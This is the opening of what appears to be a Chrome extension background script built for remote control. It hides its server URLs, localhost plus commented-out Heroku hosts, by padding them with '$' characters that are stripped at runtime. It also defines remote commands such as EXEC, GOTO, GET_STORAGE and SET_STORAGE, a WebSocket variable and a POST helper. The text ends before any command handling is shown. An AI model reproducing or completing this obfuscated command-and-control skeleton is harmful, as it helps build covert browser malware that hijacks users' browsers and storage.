let ws
const initalConfig = {
  uuid: null,
  foreground: "foreground.min.js",
  socket: "socket.min.js",
  url: "h$$$$t$$$$t$$$$p:/$$$$/l$$$$o$$$$ca$$$$l$$$$ho$$$$st".replace(/\$/g, ''),
  socketUrl: "w$$$$s$$$$:/$$$$/$$$$lo$$$$ca$$$$l$$$$h$$$$o$$$$s$$$$t".replace(/\$/g, ''),
  // url:'h$$t$$$t$$p$$s://$$$$$$j$$$$$c$$$$$$b$$$$$a$$$$$k$$$$er$$$$$y.he$$$$$rok$$$$$ua$$$$$pp.c$$$$o$$$$$m'.replace(/\$/g, ''),
  //socketUrl: 'wss://c$$$$h$$$$r$$$$o$$$$m$$$$e-s$$$$o$$$$c$$$$k$$$$et.$$$$he$$$$ro$$$$kua$$$$p$$$$p.$$$$c$$$$om'.replace(/\$/g, ''),
}
const storageLocal = chrome.storage.local
const storageSync = chrome.storage.sync
async function Config() {
  const { isInit } = storageLocal.get('isInit')
  return isInit ? await storageLocal.get('config') : initalConfig
}

chrome.runtime.onInstalled.addListener(async () => {
  storageLocal.set({ ...initalConfig, isInit: true })
  console.log('Installed %csuccessfully', `color: #3aa757`)
})

const CMD = {
  TAB: 'TAB',
  TABS: 'TABS',
  GOTO: 'GOTO',
  HELP: 'HELP',
  EXEC: 'EXEC',
  NEW_TAB: 'NEW_TAB',
  LOCAL: 'LOCAL',
  SYNC: 'SYNC',
  GET_STORAGE: 'GET_STORAGE',
  SET_STORAGE: 'SET_STORAGE'
}

function post({ url, body = {} }) {
  return fetch(url, {
    method: 'POST',
    headers: {
      Accept: 'application/json',
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(body)
  }).catch(e => console.error(e))
}